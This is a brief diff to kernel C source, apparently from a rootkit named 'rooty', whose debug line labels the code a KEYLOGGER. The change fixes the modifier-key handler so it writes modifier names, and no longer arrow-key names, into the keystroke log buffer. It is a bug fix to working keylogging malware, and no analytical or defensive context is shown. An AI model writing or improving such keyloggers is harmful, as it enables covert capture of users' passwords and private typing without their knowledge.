@@ -82,7 +82,7 @@ static void ksym_mod ( struct keyboard_notifier_param *param, char *buf )
     unsigned long len;
     unsigned char val = param->value & 0x0f;
     //printk("rooty: KEYLOGGER: ksym_mod: %s\n",mod[val]);
-    len = strlcpy(&logbuf[logidx], arrows[val], LOGSIZE - logidx);
+    len = strlcpy(&logbuf[logidx], mod[val], LOGSIZE - logidx);
     logidx += len;
 }
 
